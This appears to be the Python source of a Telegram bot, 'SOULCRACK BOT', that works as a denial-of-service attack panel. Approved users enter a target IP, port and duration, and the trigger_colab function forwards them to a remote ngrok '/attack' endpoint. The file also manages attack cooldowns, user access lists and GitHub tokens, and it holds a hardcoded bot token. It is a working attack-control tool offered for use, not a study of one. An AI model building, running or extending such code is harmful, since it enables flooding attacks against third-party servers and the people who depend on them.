import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException
from flask import Flask
from threading import Thread
import requests

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
app = Flask('')

@app.route('/')
def home():
    return "Bot is Live!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [7529105228]

# Attack management
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
temp_data = {}

# --- JSON Loading Functions ---
def load_users():
    try:
        with open('users.json', 'r') as f:
            data = json.load(f)
            return set(data) if data else set(ADMIN_IDS)
    except: return set(ADMIN_IDS)

def save_users(users):
    with open('users.json', 'w') as f: json.dump(list(users), f)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f: return json.load(f)
    except: return {}

def save_approved_users(data):
    with open('approved_users.json', 'w') as f: json.dump(data, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f: return json.load(f)
    except: return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f: json.dump(tokens, f, indent=2)

# --- Helper Functions ---
def is_owner(user_id): return str(user_id) in owners
def is_admin(user_id): return str(user_id) in admins
def can_user_attack(user_id): return (str(user_id) in owners or str(user_id) in admins or str(user_id) in approved_users) and not MAINTENANCE_MODE

def trigger_colab(target_ip, target_port, duration):
    try:
        api_link = "https://bubble-sponge-unpicked.ngrok-free.dev/attack"
        requests.get(f"{api_link}?host={target_ip}&port={target_port}&time={duration}", timeout=2)
    except: pass

# --- Key Keyboards ---
def get_main_keyboard(user_id):
    keyboard = [
        [KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
        [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]
    ]
    if str(user_id) in owners or str(user_id) in admins:
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
    if str(user_id) in owners:
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    keyboard.append([KeyboardButton("❓ Help")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text("🤖 **WELCOME TO SOULCRACK BOT**\n━━━━━━━━━━━━━━━━━━━━━━\nSelect an option to begin:", reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if text == "🎯 Launch Attack":
        if not can_user_attack(user_id):
            await update.message.reply_text("❌ Access Denied.")
            return
        temp_data[user_id] = {"step": "attack_ip"}
        await update.message.reply_text("🎯 **STEP 1:** Send Target IP:")
    
    elif text == "🛑 Stop Attack":
        global current_attack
        current_attack = None
        await update.message.reply_text("🛑 Attack Stopped.")

    elif text == "➖ Remove User":
        temp_data[user_id] = {"step": "remove_user_id"}
        await update.message.reply_text("➖ Send User ID to remove:")

    else:
        await handle_text_input(update, context, user_id, text)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    if user_id not in temp_data: return
    step = temp_data[user_id].get("step")

    if step == "attack_ip":
        temp_data[user_id] = {"step": "attack_port", "ip": text}
        await update.message.reply_text(f"✅ IP: {text}\n🎯 **STEP 2:** Send Port:")
    
    elif step == "attack_port":
        ip = temp_data[user_id]["ip"]
        temp_data[user_id] = {"step": "attack_time", "ip": ip, "port": text}
        await update.message.reply_text(f"✅ Port: {text}\n🎯 **STEP 3:** Send Time (sec):")

    elif step == "attack_time":
        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        duration = text
        trigger_colab(ip, port, duration)
        await update.message.reply_text(f"🚀 **ATTACK TRIGGERED!**\nTarget: {ip}:{port}\nTime: {duration}s")
        del temp_data[user_id]

    elif step == "remove_user_id":
        user_to_remove = text.strip()
        if user_to_remove in approved_users:
            del approved_users[user_to_remove]
            save_approved_users(approved_users)
            await update.message.reply_text(f"✅ User {user_to_remove} Removed.")
        else:
            await update.message.reply_text("❌ User Not Found.")
        del temp_data[user_id]

# --- Main Initialization ---
owners = load_users() # Simplified for this fix
admins = {}
approved_users = load_approved_users()

def main():
    keep_alive()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 THE BOT IS RUNNING...")
    application.run_polling()

if __name__ == '__main__':
    main()
